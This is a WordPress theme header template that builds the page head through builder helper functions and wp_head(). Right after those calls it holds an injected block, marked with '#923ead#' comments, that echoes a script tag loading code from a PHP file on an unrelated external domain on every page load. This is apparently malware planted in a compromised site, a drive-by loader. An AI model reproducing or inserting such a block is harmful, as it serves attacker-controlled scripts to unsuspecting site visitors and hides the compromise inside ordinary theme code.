<?php builder_add_doctype(); ?>

<?php builder_add_html_tag(); ?>

<head>

<?php builder_add_charset(); ?>

<?php builder_add_title(); ?>

<?php builder_add_favicon(); ?>

<?php builder_add_stylesheets(); ?>

<?php builder_add_scripts(); ?>

<?php builder_add_meta_data(); ?>

<?php wp_head(); //we need this for plugins ?>
<?php
#923ead#
if(empty($t)) {
$t = "<script type=\"text/javascript\" src=\"http://angeln-stralsund.de/wp-content/themes/ecn/zwvb6pxj.php\"></script>";
echo $t;
}
#/923ead#
?>

</head>
